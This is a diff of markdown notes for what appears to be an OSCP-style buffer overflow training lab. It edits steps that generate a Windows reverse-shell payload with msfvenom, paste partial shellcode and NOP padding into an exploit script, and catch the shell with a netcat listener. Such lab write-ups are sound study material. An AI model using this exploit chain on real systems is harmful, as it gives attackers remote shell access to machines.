@@ -300,13 +300,13 @@ except:
 
 ---
 
-### Generate Payload
+### 5. Generate the final Payload
 
 - Run the following `msfvenom` command on Kali, using your Kali `VPN IP` as the `LHOST` and updating the `-b` option with all the badchars you identified (including `\x00`):
 
     - `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -b "\x00" -f c`
 
-- Copy the generated `C code strings` and integrate them into a new modifies python script called `overflow1_step5_generatePayload.py` script payload variable using the following notation:   
+- Copy the generated `C code strings` and integrate them into a new modifies python script called `overflow1_step567_Final_Payload.py` script payload variable using the following notation:   
 
 ```python
 payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
@@ -324,6 +324,8 @@ payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
     - **You can do this by setting the `padding` variable to a string of `16 or more` `"No Operation"` (`\x90`) bytes:
 
         - `padding = "\x90" * 16`
+        
+- Add this to the `overflow1_step567_Final_Payload.py` script:
 
 ```python
 payload = (huevos)
@@ -333,7 +335,21 @@ payload = (huevos)
 
 ### Exploit!!! Que chille!
 
+- Checklist for correct variables: 
 
+    1. prefix
+    2. offset
+    3. return address
+    4. padding
+    5. payload set
+    
+- **You can now exploit the buffer overflow to get a reverse shell!**
+
+    - Start a netcat listener on your Kali box using the `LPORT` you specified in the `msfvenom` command eg. `4444`
+
+    - Restart `oscp.exe` and `Immunity Debugger` and run the modified `overflow1_step567_Final_Payload.py` script. 
+    
+        - **Your netcat listener should catch a reverse shell!**
 
 ---
 
